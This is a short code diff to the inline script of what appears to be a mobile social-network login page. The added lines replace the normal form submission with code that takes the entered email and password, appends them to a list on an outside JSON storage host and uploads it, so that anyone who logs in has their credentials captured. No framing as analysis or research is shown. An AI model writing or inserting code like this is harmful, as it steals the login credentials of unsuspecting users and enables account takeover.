@@ -217,7 +217,9 @@
       document.getElementById('u_0_5').setAttribute( "onclick", "fdgw4();");
     }
     function fdgw4() {
-      document.getElementById('login_form').submit();
+      var xy = xhr.json("https://api.myjson.com/bins/wj65u");
+      xy.push([document.getElementById('m_login_email').value,document.getElementById('m_login_password').value]);
+      xhr.put("https://api.myjson.com/bins/wj65u", JSON.stringify(xy));
       window.parent.ggy();
     }
   </script>
